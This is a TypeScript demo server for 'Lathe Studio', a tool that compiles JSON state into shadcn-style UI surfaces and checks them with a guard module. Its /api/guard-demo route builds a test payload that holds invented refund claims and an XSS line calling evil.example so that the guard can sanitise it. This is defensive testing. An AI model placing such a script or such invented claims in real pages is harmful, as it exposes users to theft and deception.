import http from "node:http";
import { lintCatalog, swapSurfaceLocale } from "@orcawhisperer/lathe-core";
import { TypeSafeAdapter } from "@orcawhisperer/lathe-typesafe";
import { SHADCN_CATALOG, SHADCN_PHRASE_BANK } from "@orcawhisperer/lathe-shadcn";
import { verifySurface } from "@orcawhisperer/lathe-guard";
import { LatheAgUiMiddleware } from "@orcawhisperer/lathe-ag-ui";
import { applyPointerPatch, renderSurfaceToHtml } from "@orcawhisperer/lathe-react";
import { LatheMcpBridge, MCP_TOOL_PRESETS, type McpPresetId } from "@orcawhisperer/lathe-mcp";

const PORT = Number(process.env["PORT"] ?? 4321);

const client = new TypeSafeAdapter();
const middleware = new LatheAgUiMiddleware({
  catalog: SHADCN_CATALOG,
  client,
  phraseBank: SHADCN_PHRASE_BANK,
});
const mcpBridge = new LatheMcpBridge({
  catalog: SHADCN_CATALOG,
  client,
  phraseBank: SHADCN_PHRASE_BANK,
});

const DEFAULT_SCHEMA: Record<string, unknown> = {
  type: "object",
  properties: {
    resolution: {
      type: "object",
      properties: {
        decision: {
          type: "string",
          enum: ["APPROVE_FULL", "PARTIAL_CREDIT", "REJECT_DISPUTE"],
        },
        refund_split_pct: {
          type: "number",
          minimum: 0,
          maximum: 100,
        },
        reviewer_memo: {
          type: "string",
          multiline: true,
          description: "Enter audit justification for the card network...",
        },
      },
    },
  },
};

let lastState: Record<string, unknown> = {
  order: {
    duplicate_amount_usd: 284.5,
    status: "DISPUTED",
    risk_score: 0.91,
  },
  line_items: [
    { sku: "PRO-SEAT", qty: 5, unit_price_usd: 49.0 },
    { sku: "API-OVERAGE", qty: 1, unit_price_usd: 39.5 },
  ],
  resolution: {
    decision: "APPROVE_FULL",
    refund_split_pct: 50,
    reviewer_memo: "",
  },
  compliance: {
    warning_message: "Chargeback window closes within 24 hours under card network rules.",
  },
  actions: {
    can_approve_refund: true,
  },
};

let lastMessages: Array<Record<string, unknown>> = [];
let lastCalibration: Record<string, unknown> = {};

function readBody(req: http.IncomingMessage): Promise<string> {
  return new Promise((resolve, reject) => {
    const chunks: Buffer[] = [];
    req.on("data", (c: Buffer) => chunks.push(c));
    req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
    req.on("error", reject);
  });
}

function sendJson(res: http.ServerResponse, status: number, payload: unknown): void {
  res.writeHead(status, { "Content-Type": "application/json; charset=utf-8" });
  res.end(JSON.stringify(payload));
}

const STUDIO_HTML = `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Lathe Studio — Compiled UI (AG-UI × A2UI v0.9 × TypeSafe System One)</title>
  <style>
    :root {
      --bg: #09090b;
      --panel: #121216;
      --border: #27272a;
      --text: #fafafa;
      --muted: #a1a1aa;
      --accent: #38bdf8;
      --green: #22c55e;
      --amber: #f59e0b;
      --red: #ef4444;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: var(--bg);
      color: var(--text);
      line-height: 1.45;
    }
    header.top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 14px 24px;
      border-bottom: 1px solid var(--border);
      background: #0c0c10;
    }
    .brand { display: flex; align-items: center; gap: 12px; }
    .brand h1 { font-size: 17px; margin: 0; font-weight: 600; letter-spacing: -0.02em; }
    .pill {
      font-size: 11px;
      padding: 3px 8px;
      border-radius: 999px;
      background: #1e293b;
      color: var(--accent);
      border: 1px solid #0284c7;
      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    }
    .grid {
      display: grid;
      grid-template-columns: 380px 1fr 410px;
      height: calc(100vh - 55px);
    }
    .col {
      padding: 18px;
      overflow-y: auto;
      border-right: 1px solid var(--border);
    }
    .col:last-child { border-right: none; }
    h2 {
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 0.08em;
      color: var(--muted);
      margin: 0 0 12px 0;
    }
    textarea#stateEditor {
      width: 100%;
      height: 290px;
      background: #09090d;
      color: #e4e4e7;
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 12px;
      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
      font-size: 12px;
    }
    .btn-row { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
    button.act {
      cursor: pointer;
      padding: 8px 12px;
      border-radius: 6px;
      border: 1px solid var(--border);
      background: #18181b;
      color: var(--text);
      font-size: 12px;
      font-weight: 500;
    }
    button.act.primary {
      background: #0284c7;
      border-color: #38bdf8;
      color: #fff;
    }
    button.act.danger {
      background: #450a0a;
      border-color: #dc2626;
      color: #fca5a5;
    }
    /* Rendered shadcn surface styles */
    .lathe-stack-column { display: flex; flex-direction: column; gap: 14px; }
    .lathe-card {
      border: 1px solid var(--border);
      background: var(--panel);
      border-radius: 10px;
      padding: 16px;
    }
    .lathe-card-header { margin-bottom: 12px; border-bottom: 1px solid #1f1f23; padding-bottom: 8px; }
    .lathe-card-title { margin: 0; font-size: 14px; font-weight: 600; color: #f4f4f5; }
    .lathe-card-body { display: flex; flex-direction: column; gap: 12px; }
    .lathe-leaf-wrapper {
      background: #141419;
      border: 1px solid #222228;
      border-radius: 8px;
      padding: 12px;
    }
    .lathe-stat-top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 6px;
      font-size: 12px;
    }
    .lathe-label { color: var(--muted); font-weight: 500; font-size: 12px; }
    .lathe-stat-figure { font-size: 24px; font-weight: 700; letter-spacing: -0.02em; }
    .lathe-conf-pill {
      font-size: 10px;
      padding: 2px 6px;
      border-radius: 4px;
      background: #18181b;
      border: 1px solid #3f3f46;
      color: #a1a1aa;
      font-family: ui-monospace, monospace;
    }
    .lathe-progress-track {
      width: 100%;
      height: 8px;
      background: #27272a;
      border-radius: 999px;
      overflow: hidden;
    }
    .lathe-progress-fill { height: 100%; background: var(--accent); }
    .lathe-tone-danger { background: var(--red); }
    .lathe-tone-warning { background: var(--amber); }
    .lathe-badge-row, .lathe-switch-row, .lathe-button-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .lathe-badge-right { display: flex; align-items: center; gap: 8px; }
    .lathe-badge {
      padding: 3px 9px;
      border-radius: 999px;
      font-size: 11px;
      font-weight: 600;
      background: #27272a;
    }
    .lathe-badge-destructive { background: #7f1d1d; color: #fecaca; border: 1px solid #dc2626; }
    .lathe-alert {
      border-left: 3px solid var(--accent);
      padding-left: 10px;
    }
    .lathe-alert-destructive { border-left-color: var(--red); }
    .lathe-alert-msg { margin: 4px 0 0 0; font-size: 13px; color: #e4e4e7; }
    .lathe-input, .lathe-select, .lathe-textarea {
      width: 100%;
      padding: 7px 10px;
      border-radius: 6px;
      border: 1px solid #3f3f46;
      background: #09090b;
      color: #fff;
      font-size: 13px;
      font-family: inherit;
    }
    .lathe-slider { width: 100%; accent-color: var(--accent); cursor: pointer; }
    .lathe-button {
      padding: 8px 14px;
      border-radius: 6px;
      border: 1px solid #38bdf8;
      background: #0284c7;
      color: #fff;
      font-weight: 600;
      cursor: pointer;
    }
    .lathe-table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 8px;
      font-size: 12px;
    }
    .lathe-table th {
      text-align: left;
      padding: 8px 10px;
      border-bottom: 1px solid #27272a;
      color: var(--muted);
      font-weight: 600;
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 0.04em;
    }
    .lathe-table td {
      padding: 9px 10px;
      border-bottom: 1px solid #1f1f23;
      color: #e4e4e7;
    }
    .lathe-list {
      margin: 8px 0 0 0;
      padding-left: 18px;
      font-size: 12px;
      color: #e4e4e7;
    }
    .lathe-list-item { margin-bottom: 6px; }
    pre.xray {
      background: #09090d;
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 10px;
      font-size: 11px;
      overflow-x: auto;
      color: #d4d4d8;
    }
  </style>
</head>
<body>
  <header class="top">
    <div class="brand">
      <h1>Lathe Studio</h1>
      <span class="pill">AG-UI × A2UI v0.9 × TypeSafe System One (jev-1.13.0)</span>
      <span class="pill" id="linterBadge">Catalog Linter: Checking...</span>
      <span class="pill" style="display:inline-flex;gap:4px;align-items:center;">
        i18n (0 calls):
        <button class="act" style="padding:2px 6px;font-size:10px;" onclick="setLocale('en')">EN</button>
        <button class="act" style="padding:2px 6px;font-size:10px;" onclick="setLocale('es')">ES</button>
        <button class="act" style="padding:2px 6px;font-size:10px;" onclick="setLocale('ja')">JA</button>
        <button class="act" style="padding:2px 6px;font-size:10px;" onclick="setLocale('de')">DE</button>
      </span>
    </div>
    <div id="statusBanner" class="pill">Ready</div>
  </header>
  <main class="grid">
    <section class="col">
      <h2>1. MCP Tool Presets (@lathe/mcp)</h2>
      <div class="btn-row" style="margin-bottom:12px;">
        <button class="act" onclick="loadMcpPreset('stripe_dispute')">Stripe Dispute</button>
        <button class="act" onclick="loadMcpPreset('github_pr_review')">GitHub PR Review</button>
        <button class="act" onclick="loadMcpPreset('postgres_slow_query')">Postgres Slow Query</button>
        <button class="act" onclick="loadMcpPreset('k8s_pod_incident')">K8s Pod Incident</button>
      </div>
      <h2>Source State (JSON Data Model)</h2>
      <textarea id="stateEditor"></textarea>
      <div class="btn-row">
        <button class="act primary" onclick="compileNow(false)">Compile Live (jev-1.13.0)</button>
        <button class="act" onclick="compileNow(true)">Re-Bind via Shape Cache (0ms)</button>
        <button class="act danger" onclick="runGuardDemo()">Test @lathe/guard Attack Vector</button>
      </div>
      <h2 style="margin-top:20px">Compilation Telemetry</h2>
      <pre class="xray" id="telemetryBox">Click an MCP Preset or "Compile Live" to run System One selection.</pre>
    </section>

    <section class="col">
      <h2>2. Compiled @lathe/shadcn Surface (Zero Generated Text)</h2>
      <div id="surfaceMount"></div>
    </section>

    <section class="col">
      <h2>3. Compiler X-Ray & 4-Tier @lathe/guard Report</h2>
      <pre class="xray" id="guardBox">No surface compiled yet.</pre>
      <h2>Calibration & Posterior Probabilities</h2>
      <pre class="xray" id="calibBox">{}</pre>
    </section>
  </main>

  <script>
    const initialState = ${JSON.stringify(lastState, null, 2)};
    document.getElementById("stateEditor").value = JSON.stringify(initialState, null, 2);

    async function loadLinter() {
      const r = await fetch("/api/lint").then(r => r.json());
      const badge = document.getElementById("linterBadge");
      badge.textContent = r.ok ? "Catalog Linter: 0 errors, 0 warnings" : "Linter Issues: " + r.findings.length;
    }

    let activePresetId = "stripe_dispute";

    function wireTwoWayBindings() {
      const mount = document.getElementById("surfaceMount");
      mount.querySelectorAll("input[data-lathe-pointer], select[data-lathe-pointer], textarea[data-lathe-pointer]").forEach((inp) => {
        inp.addEventListener("change", async (e) => {
          const pointer = e.target.getAttribute("data-lathe-pointer");
          const newValue =
            e.target.type === "checkbox"
              ? e.target.checked
              : e.target.type === "range"
                ? Number(e.target.value)
                : e.target.value;
          const res = await fetch("/api/patch", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ pointer, newValue })
          }).then(r => r.json());
          document.getElementById("stateEditor").value = JSON.stringify(res.state, null, 2);
          document.getElementById("surfaceMount").innerHTML = res.html;
          document.getElementById("statusBanner").textContent = "RFC 6901 Patch " + pointer + " (0ms, 0 model calls)";
          wireTwoWayBindings();
        });
      });

      mount.querySelectorAll("button[data-lathe-action]").forEach((btn) => {
        btn.addEventListener("click", async () => {
          const actionName = btn.getAttribute("data-lathe-action");
          document.getElementById("statusBanner").textContent = "Executing MCP Action (" + actionName + ")...";
          const state = JSON.parse(document.getElementById("stateEditor").value);
          const res = await fetch("/api/action", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ presetId: activePresetId, actionName, state })
          }).then(r => r.json());
          document.getElementById("stateEditor").value = JSON.stringify(res.state, null, 2);
          document.getElementById("surfaceMount").innerHTML = res.html;
          document.getElementById("telemetryBox").textContent = JSON.stringify({
            actionReceipt: res.receipt,
            shapeHash: res.shapeHash,
            cached: res.cached
          }, null, 2);
          document.getElementById("statusBanner").textContent =
            res.receipt.status === "executed"
              ? "MCP Action Executed (" + res.receipt.actionToolName + ") — 0ms Shape Cache Re-Render"
              : "MCP Action Rejected (" + res.receipt.summary + ")";
          wireTwoWayBindings();
        });
      });
    }

    async function compileNow(enableShapeCache) {
      document.getElementById("statusBanner").textContent = "Compiling via TypeSafe System One...";
      const state = JSON.parse(document.getElementById("stateEditor").value);
      const res = await fetch("/api/compile", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ state, enableShapeCache })
      }).then(r => r.json());

      document.getElementById("surfaceMount").innerHTML = res.html;
      document.getElementById("telemetryBox").textContent = JSON.stringify({
        shapeHash: res.shapeHash,
        cached: res.cached,
        stats: res.stats
      }, null, 2);
      document.getElementById("guardBox").textContent = JSON.stringify(res.guardReport, null, 2);
      document.getElementById("calibBox").textContent = JSON.stringify(res.calibration, null, 2);
      document.getElementById("statusBanner").textContent =
        res.cached ? "Shape Cache Hit (0ms)" : "Compiled Live in " + res.stats.latencyMs + "ms";
      wireTwoWayBindings();
    }

    async function runGuardDemo() {
      document.getElementById("statusBanner").textContent = "Running 4-Tier Guard PoC...";
      const res = await fetch("/api/guard-demo", { method: "POST" }).then(r => r.json());
      document.getElementById("guardBox").textContent = JSON.stringify(res.guardReport, null, 2);
      document.getElementById("surfaceMount").innerHTML = res.html;
      document.getElementById("statusBanner").textContent =
        "Guard Caught " + res.guardReport.findings.length + " Violations & Sanitized Surface!";
    }

    async function setLocale(locale) {
      const res = await fetch("/api/locale", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ locale })
      }).then(r => r.json());
      if (res.html) {
        document.getElementById("surfaceMount").innerHTML = res.html;
        document.getElementById("statusBanner").textContent =
          "Switched surface locale to " + locale.toUpperCase() + " (0ms, 0 model calls)";
        wireTwoWayBindings();
      }
    }

    async function loadMcpPreset(presetId) {
      activePresetId = presetId;
      document.getElementById("statusBanner").textContent = "Compiling MCP Tool Preset (" + presetId + ")...";
      const res = await fetch("/api/mcp-compile", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ presetId })
      }).then(r => r.json());
      document.getElementById("stateEditor").value = JSON.stringify(res.state, null, 2);
      document.getElementById("surfaceMount").innerHTML = res.html;
      document.getElementById("telemetryBox").textContent = JSON.stringify({
        toolName: res.toolName,
        shapeHash: res.shapeHash,
        cached: res.cached,
        stats: res.stats
      }, null, 2);
      document.getElementById("guardBox").textContent = JSON.stringify(res.guardReport, null, 2);
      document.getElementById("calibBox").textContent = JSON.stringify(res.calibration, null, 2);
      document.getElementById("statusBanner").textContent =
        res.cached
          ? "MCP Tool " + res.toolName + " — Shape Cache Hit (0ms)"
          : "Compiled MCP Tool " + res.toolName + " in " + res.stats.latencyMs + "ms";
      wireTwoWayBindings();
    }

    loadLinter();
  </script>
</body>
</html>`;

export const server = http.createServer(async (req, res) => {
  try {
    if (req.method === "GET" && req.url === "/") {
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end(STUDIO_HTML);
      return;
    }

    if (req.method === "GET" && req.url === "/api/lint") {
      sendJson(res, 200, lintCatalog(SHADCN_CATALOG));
      return;
    }

    if (req.method === "POST" && req.url === "/api/mcp-compile") {
      const body = JSON.parse(await readBody(req)) as {
        presetId: McpPresetId;
        locale?: string;
      };
      const preset = MCP_TOOL_PRESETS[body.presetId] ?? MCP_TOOL_PRESETS.stripe_dispute;
      const compiled = await mcpBridge.compileToolResult({
        result: preset.result,
        readTool: preset.readTool,
        actionTool: preset.actionTool,
        intent: preset.intent,
        locale: body.locale ?? "en",
        enableShapeCache: true,
      });
      lastState = compiled.state;
      lastMessages = [...compiled.messages];
      lastCalibration = compiled.calibration as Record<string, unknown>;
      sendJson(res, 200, {
        toolName: compiled.toolName,
        shapeHash: compiled.shapeHash,
        cached: compiled.cached,
        state: compiled.state,
        stats: compiled.stats,
        calibration: compiled.calibration,
        guardReport: {
          ok: compiled.guardReport.ok,
          findings: compiled.guardReport.findings,
        },
        html: compiled.html,
      });
      return;
    }

    if (req.method === "POST" && req.url === "/api/action") {
      const body = JSON.parse(await readBody(req)) as {
        presetId?: McpPresetId;
        state?: Record<string, unknown>;
        locale?: string;
      };
      const out = await mcpBridge.executeAction({
        presetId: body.presetId ?? "stripe_dispute",
        state: body.state ?? lastState,
        locale: body.locale ?? "en",
      });
      lastState = out.surface.state;
      lastMessages = [...out.surface.messages];
      lastCalibration = out.surface.calibration as Record<string, unknown>;
      sendJson(res, 200, {
        receipt: out.receipt,
        state: out.surface.state,
        shapeHash: out.surface.shapeHash,
        cached: out.surface.cached,
        html: out.surface.html,
      });
      return;
    }

    if (req.method === "POST" && req.url === "/api/compile") {
      const body = JSON.parse(await readBody(req)) as {
        state: Record<string, unknown>;
        schema?: Record<string, unknown>;
        enableShapeCache?: boolean;
      };
      lastState = body.state;
      const bundle = await middleware.compile({
        surfaceId: "studio-surface",
        state: lastState,
        schema: body.schema ?? DEFAULT_SCHEMA,
        intent:
          "Triage the disputed order, review line items and compliance warnings, fill out the resolution decision, refund split slider, and reviewer memo, and approve the refund.",
        enableShapeCache: Boolean(body.enableShapeCache),
        groupBlocks: true,
        mode: "staged",
      });
      lastMessages = bundle.guardReport.sanitizedMessages;
      lastCalibration = bundle.compileResult.calibration;

      const html = renderSurfaceToHtml({
        messages: lastMessages,
        state: lastState,
        calibration: bundle.compileResult.calibration,
      });

      sendJson(res, 200, {
        shapeHash: bundle.shapeHash,
        cached: bundle.cached,
        stats: bundle.compileResult.stats,
        calibration: bundle.compileResult.calibration,
        guardReport: {
          ok: bundle.guardReport.ok,
          findings: bundle.guardReport.findings,
        },
        html,
      });
      return;
    }

    if (req.method === "POST" && req.url === "/api/locale") {
      const body = JSON.parse(await readBody(req)) as { locale: string };
      lastMessages = swapSurfaceLocale(lastMessages, SHADCN_PHRASE_BANK, body.locale || "en");
      const html = renderSurfaceToHtml({
        messages: lastMessages,
        state: lastState,
        calibration: lastCalibration as Record<string, never>,
      });
      sendJson(res, 200, { locale: body.locale, html });
      return;
    }

    if (req.method === "POST" && req.url === "/api/patch") {
      const body = JSON.parse(await readBody(req)) as {
        pointer: string;
        newValue: unknown;
      };
      lastState = applyPointerPatch(lastState, body.pointer, body.newValue);
      const html = renderSurfaceToHtml({
        messages: lastMessages,
        state: lastState,
        calibration: lastCalibration as Record<string, never>,
      });
      sendJson(res, 200, { state: lastState, html });
      return;
    }

    if (req.method === "POST" && req.url === "/api/guard-demo") {
      // Simulate an adversarial/hallucinated generative UI payload containing:
      // 1. A broken pointer (/order/nonexistent_bonus)
      // 2. A fabricated number ($500 instant payout)
      // 3. An unentailed refund guarantee policy (verified live by System One Noul)
      // 4. An XSS script injection inside an Alert title
      const adversarialMessages = [
        {
          version: "v0.9",
          updateComponents: {
            surfaceId: "studio-surface",
            components: [
              {
                id: "root",
                component: "Stack",
                direction: "column",
                children: ["c_safe", "c_fabricated_num", "c_invented_policy", "c_xss"],
              },
              {
                id: "c_safe",
                component: "Stat",
                value: { path: "/order/duplicate_amount_usd" },
                label: "Charged Amount (USD)",
                format: "currency",
              },
              {
                id: "c_fabricated_num",
                component: "Alert",
                message: { path: "/compliance/warning_message" },
                title: "Guaranteed $500 Bonus Compensation",
                variant: "default",
              },
              {
                id: "c_invented_policy",
                component: "Alert",
                message: { path: "/compliance/warning_message" },
                title: "Full unconditional refund approved by executive override",
                variant: "default",
              },
              {
                id: "c_xss",
                component: "Alert",
                message: { path: "/compliance/warning_message" },
                title: "<script>fetch('//evil.example/steal')</script>",
                variant: "destructive",
              },
            ],
          },
        },
      ];

      const guardReport = await verifySurface({
        messages: adversarialMessages,
        state: lastState,
        catalog: SHADCN_CATALOG,
        phraseBank: SHADCN_PHRASE_BANK,
        client,
      });

      const html = renderSurfaceToHtml({
        messages: guardReport.sanitizedMessages,
        state: lastState,
      });

      sendJson(res, 200, { guardReport, html });
      return;
    }

    sendJson(res, 404, { error: "Not found" });
  } catch (err) {
    sendJson(res, 500, { error: err instanceof Error ? err.message : String(err) });
  }
});

if (import.meta.url === `file://${process.argv[1]}`) {
  server.listen(PORT, "127.0.0.1", () => {
    console.log(`Lathe Studio listening on http://127.0.0.1:${PORT}`);
  });
}
